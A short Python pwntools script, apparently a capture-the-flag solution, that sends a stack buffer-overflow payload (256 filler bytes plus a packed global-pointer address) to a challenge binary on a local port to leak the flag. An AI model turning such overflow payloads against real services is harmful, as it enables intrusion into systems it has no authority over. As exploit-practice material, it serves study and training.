from pwn import *
import binascii
import time
import struct

elfPath = "pwn0"
libcPath = ""
remoteAddr = "127.0.0.1"
remotePort = 8997

context.binary = elfPath
context.log_level="debug"

if sys.argv[1] == "local":
    context.log_level = "debug"
    sh = process(elfPath, env = {"LD_PRELOAD": libcPath})
    if libcPath:
        libc = ELF(libcPath)
else:
    context.log_level = "debug"
    sh = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)

global_ptr=0x804A080
payload = 'a'*256 + p32(global_ptr) #change argv[0]->global_ptr

gdb.attach("b *0x8048640")  #gdb-debug or in gdb-b *
gdb.attach("b *0x8048645") 

sh.recvuntil("flag!")
sh.sendline(payload)

sh.interactive()
sh.close()
